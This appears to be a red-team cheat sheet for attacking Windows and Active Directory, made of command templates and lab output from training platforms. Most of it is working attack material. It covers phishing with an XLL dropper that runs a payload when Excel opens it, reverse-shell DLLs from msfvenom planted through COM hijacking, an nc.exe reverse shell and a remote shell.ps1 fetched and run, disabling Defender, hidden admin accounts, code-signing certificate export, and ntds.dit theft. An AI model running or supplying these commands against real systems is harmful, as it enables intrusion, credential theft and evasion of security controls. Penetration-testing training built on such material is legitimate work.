nxc mssql <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> -M enum_logins

# Local Auth
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M enum_logins

$ nxc mssql DC.REDELEGATE.VL -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth -M enum_logins     
MSSQL       10.129.254.242  1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)

4. Enumerate Linked MSSQL Servers

nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M enum_links

# NTLM
nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M enum_links

# Password-based Kerberos
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> -M enum_links

# NTLM-based Kerberos
nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> -M enum_links

# Ticket-based Kerberos
nxc mssql <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> -M enum_links

nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M enum_links

1. Import Module

. .\PowerUpSQL.ps1

2. Audit

Invoke-SQLAudit -Instance <TARGET> -Username '<USER>' -Password '<PASSWORD>' -Verbose

3. Execute Query

Get-SQLQuery -Instance <TARGET> -Username '<USER>' -Password '<PASSWORD>' -Query "<QUERY>" -Verbose

Ref: PowerUpSQL.ps1

item.title: NetExec (nxc)
item.description:
General

# Single user, Single password
nxc <PROTOCOL> <TARGET> -u '<USER>' -p '<PASSWORD>'

# Single user, Single password, Local auth
nxc <PROTOCOL> <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth

# Single user, Single password (Active Directory)
nxc <PROTOCOL> <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN>

# Single user, Multiple passwords
nxc <PROTOCOL> <TARGET> -u '<USER>' -p <PASSWORDS> -d <DOMAIN>

# Multiple users, Single password
nxc <PROTOCOL> <TARGET> -u <USERS> -p '<PASSWORD>' -d <DOMAIN> --continue-on-success

# Multiple users, Multiple passwords
nxc <PROTOCOL> <TARGET> -u <USERS> -p <PASSWORDS> -d <DOMAIN> --continue-on-success

# Match username to corresponding password
nxc <PROTOCOL> <TARGET> -u <USERS> -p <PASSWORDS> --no-bruteforce --continue-on-success

# NTLM
nxc <PROTOCOL> <TARGET> -u '<USER>' -H <HASH> -d <DOMAIN>

# Password-based Kerberos
sudo ntpdate -s <DC_IP> && nxc <PROTOCOL> <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC>

# NTLM-based Kerberos
sudo ntpdate -s <DC_IP> && nxc <PROTOCOL> <TARGET> -u '<USER>' -H <HASH> -d <DOMAIN> -k --kdcHost <DC>

# Ticket-based Kerberos
sudo ntpdate -s <DC_IP> && nxc <PROTOCOL> <TARGET> -u '<USER>' -d <DOMAIN> -k --kdcHost <DC> --use-kcache

item.title: NTLM Relay Attack
item.description:
Authentication Method

Shadow Credential

1. Redirect Traffic (Pivoting Node) [Optional]

# Upload socat.zip and unzip
Expand-Archive -Path "<SOCAT_ZIP_FILE_PATH>" -DestinationPath "<DEST_PATH>" -Force

PS C:\xampp\htdocs> Expand-Archive -Path "C:\xampp\htdocs\socat.zip" -DestinationPath "C:\xampp\htdocs\" -Force

.\socat.exe tcp-listen:8090,reuseaddr,fork tcp:<LOCAL_IP>:80

PS C:\xampp\htdocs\socat-windows-master> .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:10.10.14.31:80
      0 [main] socat 2084 find_fast_cwd: WARNING: Couldn't compute FAST_CWD pointer.  Please report this problem to
the public mailing list cygwin@cygwin.com

Ref: socat

item.title: Persistence
item.description:
Add Local User

# Create new user
net user '<USER>' '<PASSWORD>' /add

PS C:\WINDOWS\system32> net user test Test1234!@ /add
The command completed successfully.

# Add user to admin group
net localgroup Administrators '<USER>' /add

PS C:\WINDOWS\system32> net localgroup administrators test /add
The command completed successfully.

# Add user to remote desktop group
net localgroup "Remote Desktop Users" '<USER>' /add

PS C:\WINDOWS\system32> net localgroup "remote desktop users" test /add
The command completed successfully.

# Add user to remote management group
net localgroup "Remote Management Users" '<USER>' /add

PS C:\WINDOWS\system32> net localgroup "Remote Management Users" test /add
The command completed successfully.

# Check
net user <USER>

PS C:\WINDOWS\system32> net user test
net user test

item.title: Phishing
item.description:
Send Email

swaks --to '<VICTIM>@<DOMAIN>' --from 'attacker@<DOMAIN>' --server '<DOMAIN>' --header 'This is not a malicious file' --body 'Check this out: http://<LOCAL_IP>:<PORT>' --attach '@<FILE>'


$obj = New-Object -ComObject WScript.Shell

$link = $obj.CreateShortcut("C:\ProgramData\Calculator.lnk")

$link.TargetPath = "C:\ProgramData\rev.exe"

$link.Save()

shell.c

#include <windows.h>

__declspec(dllexport) void __cdecl xlAutoOpen(void); 

void __cdecl xlAutoOpen() {
    // Triggers when Excel opens
    WinExec("<POWERSHELL_3_BASE64>", 1); // Replace your payload
}

BOOL APIENTRY DllMain( HMODULE hModule,
                    DWORD  ul_reason_for_call,
                    LPVOID lpReserved
                    )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

1. Compile in Linux

x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll shell.c -luser32

2. Send Email

swaks --to '<VICTIM>@<DOMAIN>' --from 'attacker@<DOMAIN>' --server '<DOMAIN>' --header 'This is not a malicious file' --body 'This is not a malicious file' --attach '@shell.xll'

Ref: revshells.com

item.title: RDP
item.description:
Enable RDP

# Enable terminal server
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0

# Allow inbound traffic
netsh advfirewall firewall add rule name="Open Port 3389 IN" dir=in action=allow protocol=TCP localport=3389

xfreerdp

# Password
xfreerdp /u:'<USER>' /p:'<PASSWORD>' /d:<DOMAIN> /v:<TARGET> /smart-sizing:1920x1080

# NTLM
xfreerdp /u:'<USER>' /pth:'<HASH>' /d:<DOMAIN> /v:<TARGET> /smart-sizing:1920x1080

xfreerdp3

# Anonymous
xfreerdp3 /v:<TARGET> /smart-sizing:1920x1080 /clipboard:direction-to:all /sec:nla:off

# Password
xfreerdp3 /u:'<USER>' /p:'<PASSWORD>' /d:<DOMAIN> /v:<TARGET> /smart-sizing:1920x1080 /clipboard:direction-to:all /sec:nla:off

# NTLM
xfreerdp3 /u:'<USER>' /pth:<HASH> /d:<DOMAIN> /v:<TARGET> /smart-sizing:1920x1080 /clipboard:direction-to:all /sec:nla:off

# Local auth
xfreerdp3 /u:'<USER>' /p:'<PASSWORD>' /v:<TARGET> /smart-sizing:1920x1080 /clipboard:direction-to:all /sec:tls:off

# Socks5
xfreerdp3 /u:'<USER>' /p:'<PASSWORD>' /d:<DOMAIN> /v:<TARGET> /smart-sizing:1920x1080 /clipboard:direction-to:all /sec:nla:off /proxy:socks5://127.0.0.1:1080

remmina

Fix ERRCONNECT_TLS_CONNECT_FAILED

Advanced -> TLS Security Level -> 0

item.title: Registry
item.description:
General

Key Hives

HKEY_LOCAL_MACHINE (HKLM)     System-wide settings (SAM, SYSTEM, SOFTWARE, SECURITY)
HKEY_CURRENT_USER (HKCU)      Current user settings
HKEY_USERS (HKU)              All loaded user profiles
HKEY_CLASSES_ROOT (HKCR)      File associations, COM objects
HKEY_CURRENT_CONFIG (HKCC)    Current hardware config

Query Key

# Displays all keys, subkeys, and values recursively
reg query <PATH> /s

# Display all keys, subkeys, and values under CLSID recursively
reg query HKCR\CLSID /s

# Display all keys, subkeys, and values containing KEYWORD recursively
reg query <PATH> /s /f "<KEYWORD>"

# Display all keys, subkeys, and values containing KEYWORD under HKLM recursively
reg query HKLM /s /f "<KEYWORD>"

Add Key

reg add <PATH>

Add Value

reg add <PATH> /v <VALUE_NAME> /t <TYPE> /d <DATA> /f

reg add HKLM\SOFTWARE\MyNewKey /v MySetting /t REG_SZ /d "TestValue" /f


REG_SZ          Text string
REG_EXPAND_SZ   String with environment variables
REG_DWORD       32-bit integer
REG_QWORD       64-bit integer
REG_BINARY      Binary data
REG_MULTI_SZ    Multiple strings
REG_NONE        Undefined data

Delete Key

reg delete <PATH> /f

Export Hive

reg save <HIVE> <DEST_PATH>

Privesc #1: COM Hijacking

1. Registry Enum

# Query all CLSID entries recursively
reg query HKCR\CLSID /s

# Query CLSID entries containing KEYWORD recursively
reg query HKCR\CLSID /s /f "<KEYWORD>"

PS C:\Windows\system32> reg query HKCR\CLSID /s /f "zip"
reg query HKCR\CLSID /s /f "zip"

HKEY_CLASSES_ROOT\CLSID\{2317---[SNIP]---20000}
    (Default)    REG_SZ    7-Zip Shell Extension

HKEY_CLASSES_ROOT\CLSID\{2317---[SNIP]---20000}\InprocServer32
    (Default)    REG_SZ    C:\Program Files\7-Zip\7-zip.dll

---[SNIP]---

2. Create a Malicious DLL

msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f dll --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.dll

$ msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f dll --platform windows LHOST=10.10.10.10 LPORT=1337 > rev.dll
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes

2. Replace Default Value

reg add "HKLM\Software\Classes\CLSID\<CLSID>\InprocServer32" /ve /d "<CUSTOM_DLL>" /f

PS C:\Windows\system32> reg add "HKLM\Software\Classes\CLSID\{2317---[SNIP]---20000}\InprocServer32" /ve /d "C:\programdata\rev.dll" /f
reg add "HKLM\Software\Classes\CLSID\{2317---[SNIP]---20000}\InprocServer32" /ve /d "C:\programdata\rev.dll" /f
The operation completed successfully.

item.description:

---------------------
2  Interactive
3  Network
4  Batch
5  Service
7  Unlock
8  NetworkCleartext
9  NewCredentials
10 RemoteInteractive
11 CachedInteractive

Ref: RunasCS

Runas (With Password and GUI)

runas /user:'<USER>' "<CMD>"

runas /user:'admin' "powershell"

# Bypass UAC
start-process powershell.exe -verb runas

Runas (With Cred Object)

1. Create Credential Object

$username = '<DOMAIN>\<USER>'

$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential($username, $password)

$username = '<DOMAIN>\<USER>'

$password = '<PASSWORD>'

$secstr = New-Object -TypeName System.Security.SecureString

$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}

$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr

item.description:
Abuse #1: Robocopy

robocopy /b <TARGET_DIR_PATH> <DEST_DIR> <TARGET_FILE>

Abuse #2: Use Helper DLLs

1. Import Helper Modules

import-module .\SeBackupPrivilegeCmdLets.dll

import-module .\SeBackupPrivilegeUtils.dll

Copy-FileSeBackupPrivilege '<TARGET_FILE_PATH>' 'C:\ProgramData\<TARGET_FILE>'

Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit C:\ProgramData\ntds.dit

Ref: SeBackupPrivilegeUtils.dll
Ref: SeBackupPrivilegeCmdLets.dll

Abuse #3: Diskshadow

1. Create a .dsh File

set context persistent nowriters
set metadata C:\ProgramData\test.cab
set verbose on
add volume c: alias test
create
expose %test% x:

2. Convert to DOS Format

unix2dos vss.dsh

3. Upload Helpers

iwr http://<LOCAL_IP>:<LOCAL_PORT>/SeBackupPrivilegeCmdLets.dll -o C:\Programdata\SeBackupPrivilegeCmdLets.dll

iwr http://<LOCAL_IP>:<LOCAL_PORT>/SeBackupPrivilegeCmdLets.dll -o C:\Programdata\SeBackupPrivilegeUtils.dll

iwr http://<LOCAL_IP>:<LOCAL_PORT>/vss.dsh -o C:\Programdata\vss.dsh

item.title: SeEnableDelegationPrivilege
item.description:
Authentication Method

Abuse #1: Unconstrained Delegation

1. Check Machine Quota

# Password
nxc ldap <DC> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M maq

$ nxc ldap DC1.delegate.vl -u 'N.Thompson' -p 'KALEB_2341' -d delegate.vl -M maq
LDAP        10.10.72.178    389    DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)
LDAP        10.10.72.178    389    DC1              [+] delegate.vl\N.Thompson:KALEB_2341 
MAQ         10.10.72.178    389    DC1              [*] Getting the MachineAccountQuota
MAQ         10.10.72.178    389    DC1              MachineAccountQuota: 10

2. Create a Computer

# Password
impacket-addcomputer -computer-name '<NEW_COMPUTER>' -computer-pass '<NEW_PASSWORD>' -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASSWORD>'

$ impacket-addcomputer -computer-name 'EvilComputer' -computer-pass 'Test1234' -dc-ip 10.10.72.178 'delegate.vl/N.Thompson:KALEB_2341'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account EvilComputer$ with password Test1234.

3. Add DNS Record

python3 dnstool.py -u '<DOMAIN>\<NEW_COMPUTER>$' -p '<NEW_PASSWORD>' -r <NEW_COMPUTER>.delegate.vl -d <LOCAL_IP> --action add <DC> -dns-ip <DC_IP>

$ python3 dnstool.py -u 'delegate.vl\EvilComputer$' -p 'Test1234' -r EvilComputer.delegate.vl -d 10.8.7.13 --action add DC1.delegate.vl -dns-ip 10.10.72.178
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully

4. Add 'TRUSTED_FOR_DELEGATION' to the New Computer

# Password
bloodyAD -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' --host <DC> --dc-ip <DC_IP> add uac '<NEW_COMPUTER>$' -f TRUSTED_FOR_DELEGATION

item.title: SeImpresonate
item.description:
Abuse #1: Recover SeImpresonate

.\FullPowers.exe -c "whoami /priv"

# Revshell
.\FullPowers.exe -c "<POWERSHELL_3_BASE64>"

Ref: FullPower

Abuse #2: Recover Tokens via Schedule Tasks

# Create a list of privileges 
[System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeImpersonatePrivilege", "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeTimeZonePrivilege"

# Create a Principal for the task 
$TaskPrincipal = New-ScheduledTaskPrincipal -UserId "<SERVICE_ACCOUNT>" -LogonType ServiceAccount -RequiredPrivilege $Privs

# Create an action for the task 
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `C:\\Windows\\Tasks\\nc.exe -e powershell <LOCAL_IP> <LOCAL_PORT>`""

# Create the task
Register-ScheduledTask -Action $TaskAction -TaskName "SomeTask" -Principal $TaskPrincipal

# Start the task
Start-ScheduledTask -TaskName "SomeTask"

item.title: Windows Code Signing
item.description:
1. Check WDAC Policies

# Look for '<Signers>' section in policies xml
ls C:\programdata\policies

2. Check Certificate

# In target signer session
Set-Location Cert:\CurrentUser\My

# List certificates
ls Cert:\CurrentUser\My

3. Export Certificate

# Create a passphrase
$pass = ConvertTo-SecureString -String "<PASSWORD>" -Force -AsPlainText

# Export certificate
Get-ChildItem -Path Cert:\CurrentUser\My\<THUMBPRINT> | Export-PfxCertificate -FilePath C:\Programdata\cert.pfx -Password $pass

4. Code Signing

.\signtool.exe sign /fd SHA256 /f "C:\Programdata\cert.pfx" /p "<PASSWORD>" "<EXE>"

5. Check

Get-AuthenticodeSignature "<EXE>"

item.title: Windows Defender
item.description:
Check Exclusion Path

.\SharpExclusionFinder.exe '<PATH>'

Ref: SharpExclusionFinder

Add Exclusion Path

Add-MpPreference -ExclusionPath '<PATH>'

Disable Defender

# Disable realtime monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Completely disable defender
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force

item.title: Windows Event Logs
item.description:
Convert evtx to json

./evtx_dump -o jsonl -t 1 -f Security.json Security.evtx

Ref: evtx_dump

Check Number of Logs

wc -l Security.json

Security

Check Computer Name

cat Security.json | jq '.Event.System.Computer' -r | sort | uniq -c | sort -nr

Overview of Event Logs

cat Security.json | jq '.Event.System.EventID' | sort | uniq -c | sort -nr

Check Specific Event

cat Security.json | jq 'select(.Event.System.EventID==4624)'

item.title: Windows Processes
item.description:
General

# Verbose
tasklist /v

# Dlls used per process
tasklist /m

# Service within process
tasklist /svc

# Filter
tasklist /FI "<KEY> eq <VALUE>"

tasklist /FI "USERNAME eq NT AUTHORITY\SYSTEM"

# Help
tasklist /?

# Or
Get-Process

# Service-related registry
Get-ChildItem -Path HKLM:\SYSTEM\CurrentControlSet\services | Get-ItemProperty | Select-Object ImagePath | Select-String <PROCESS>

Monitoring Process

Template

# Define the process name
$processName = "<PROCESS>"

# Define the interval in seconds between checks (e.g., 5 seconds)
$interval = 5

# Start an infinite loop
while ($true) {
    # Check if the process is running
    $process = Get-Process -Name $processName -ErrorAction SilentlyContinue

    if ($process) {
        # If the process is found, perform your action
        Write-Host "<PROCESS> process is running."
        
        # Perform your custom action here
        # Example: Write-Host "Performing action..."

    } else {
        # If the process is not found, output a message
        Write-Host "<PROCESS> process is not running."
    }

    # Wait for the defined interval before checking again
    Start-Sleep -Seconds $interval
}

Execution

# Bypass script execution policy
powerShell.exe -ExecutionPolicy UnRestricted -File monitor.ps1

item.title: WinRM
item.description:
Authentication Method

PsExec - Interactive Shell

Domain

# Password
impacket-psexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>

# NTLM
impacket-psexec '<DOMAIN>/<USER>@<TARGET> -hashes :<HASH>

# Password-based Kerberos
impacket-psexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET> -k

# NTLM-based Kerberos
impacket-psexec '<DOMAIN>/<USER>@<TARGET> -hashes :<HASH> -k

# Ticket-based Kerberos
impacket-psexec '<DOMAIN>/<USER>@<TARGET> -k -no-pass

Local auth

# Password
impacket-psexec '<USER>:<PASSWORD>@<TARGET>'

# NTLM
impacket-psexec '<USER>@<TARGET> -hashes :<HASH>

AtExec - Run Immediate Scheduled Task

Domain

# Password
impacket-atexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET> 'powershell.exe -c "<CMD>"'

# NTLM
impacket-atexec '<DOMAIN>/<USER>@<TARGET> -hashes :<HASH> 'powershell.exe -c "<CMD>"'

# Password-based Kerberos
impacket-atexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET> -k 'powershell.exe -c "<CMD>"'

# NTLM-based Kerberos
impacket-atexec '<DOMAIN>/<USER>@<TARGET> -hashes :<HASH> -k 'powershell.exe -c "<CMD>"'

# Ticket-based Kerberos
impacket-atexec '<DOMAIN>/<USER>@<TARGET> -k 'powershell.exe -c "<CMD>"'

Local Auth

# Password
impacket-atexec '<WORKGROUP>/<USER>:<PASSWORD>@<TARGET> 'powershell.exe -c "<CMD>"'

impacket-atexec 'WORKGROUP/test:test@192.168.10.2' 'powershell.exe -c "iex(iwr http://192.168.10.1:8443/shell.ps1 -UseBasicParsing)"'

# NTLM
impacket-atexec '<WORKGROUP>/<USER>@<TARGET> -hashes :<HASH> 'powershell.exe -c "<CMD>"'

$ impacket-atexec -hashes :a29542cb2707bf6d6c1d2c9311b0ff02 'WS01/administrator@WS01.example.com' 'powershell.exe -c "Set-MpPreference -DisableRealtimeMonitoring $true"'

evil-winrm-py

evil-winrm-py -i <TARGET> -u '<USER>' -p '<PASSWORD>'

evil-winrm-py -i <TARGET> -u '<USER>' -H '<HASH>'

# Step 1: Configure '/etc/krb5.conf' (All in UPPERCASE)

[libdefaults]
    default_realm = <DOMAIN>

[realms]
    <DOMAIN> = {
        kdc = <DC>:88
        admin_server = <DC>
        default_domain = <DOMAIN>
    }
    
[domain_realm]
    .domain.internal = <DOMAIN>
    domain.internal = <DOMAIN>

[libdefaults]
    default_realm = WINDCORP.HTB

[realms]
    WINDCORP.HTB = {
        kdc = HOPE.WINDCORP.HTB:88
        admin_server = HOPE.WINDCORP.HTB
        default_domain = WINDCORP.HTB
    }
    
[domain_realm]
    .domain.internal = WINDCORP.HTB
    domain.internal = WINDCORP.HTB

# Step 2: Request a ticket
sudo ntpdate -s <DC_IP> && impacket-getTGT '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>

# Step 3: Pass-the-ticket
export KRB5CCNAME=<CCACHE>

$ export KRB5CCNAME=winrm_user.ccache

# Step 4: Connect
sudo ntpdate -s <DC_IP> && evil-winrm-py -i <TARGET> -u '<USER>' -k --no-pass

# Password-based Kerberos
sudo ntpdate -s <DC_IP> && evil-winrm-py -i <TARGET> -u '<USER>' -p '<PASSWORD>' -k

evil-winrm-py -i <TARGET> -u '<USER>' --priv-key-pem <PRIV_KEY_PEM> --cert-pem <CERT_PEM>

# Port 5986 SSL
sudo ntpdate -s <DC_IP> && evil-winrm-py -i <TARGET> -u '<USER>' -k --no-pass --ssl

item.title: Winrm from Windows VM
item.description:
Preparation

0. Check Systeminfo

# Windows Pro is needed
systeminfo

1. Connect to VPN

OpenVPN client

2. Add DNS Server

+-----------------------------------------------------------------------------------+
| 1. Go to 'Control Panel\Network and Internet\Network and Sharing Center'          |
| 2. Click 'Local Area Connection'                                                  |
| 3. Go to 'Properties' -> 'Internet Protocol Version 4 (TCP/IPv4)' -> 'Properties' |
| 4. Under 'General', check 'Obtain an IP address automatically'                    |
| 5. Check 'Use the following DNS address' -> 'Prefer DNS Server' -> <DC_IP>        |
+-----------------------------------------------------------------------------------+

3. Add Domain to Hosts

+--------------------------------------------------------+
| 1. Run text editor as Administrator                    |
| 2. Add '<TARGET> <COMPUTER_NAME> <DC> <DOMAIN>'     |
|    to 'C:\Windows\System32\drivers\etc\hosts'          |
+--------------------------------------------------------+

4. Add Computer to Domain

+--------------------------------------------------------------------+
| 1. 'Control Panel' -> Search 'Domain'                              |
| 2. Click 'Join a Domain'                                           |
| 3. Under tab 'Computer Name' -> 'Change'                           |
| 4. Check 'Domain' -> '<DOMAIN>'                                    |
| 5. Enter username and password (domain user)                       |
| 6. If succeed, will pop an alert, 'Welcome to DOMAIN domain.'      |
+--------------------------------------------------------------------+

5. Sync Time with DC

W32tm /resync /force

item.title: WriteSPN
item.description:
Authentication Method

Targeted Kerberoast

1. Targeted Kerberoast

# Password
python3 targetedKerberoast.py -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' --dc-ip '<DC_IP>'

# NTLM
python3 targetedKerberoast.py -d '<DOMAIN>' -u '<USER>' -H :<HASH> --dc-ip '<DC_IP>'

# Password-based Kerberos
python3 targetedKerberoast.py -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' -k --dc-host '<DC>'

# NTLM-based Kerberos
python3 targetedKerberoast.py -d '<DOMAIN>' -u '<USER>' -H :<HASH> -k --dc-host '<DC>'

# Ticket-based Kerberos
python3 targetedKerberoast.py -d '<DOMAIN>' -u '<USER>' -k --no-pass --dc-host '<DC>'

2. Hash Crack

john --wordlist=/usr/share/wordlists/rockyou.txt <HASH_FILE>

Ref: targetedKerberoast
